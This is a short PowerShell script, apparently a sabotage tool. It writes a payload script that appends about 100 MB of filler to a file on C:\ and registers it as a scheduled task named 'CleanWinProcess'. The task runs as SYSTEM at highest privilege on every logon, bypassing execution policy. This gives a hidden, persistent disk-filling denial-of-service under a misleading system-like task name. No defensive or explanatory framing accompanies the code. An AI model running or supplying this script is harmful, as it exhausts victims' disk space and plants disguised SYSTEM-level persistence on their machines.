$contenuto = @'
$a = "a" * 104857600 | Out-File -FilePath "C:\prova_output.txt" -Append
'@

$contenuto | Out-File "C:\ciao.ps1"

$scriptPath = "C:\ciao.ps1"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay (New-TimeSpan -Seconds 30)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "CleanWinProcess" -Action $action -Trigger $trigger -Principal $principal
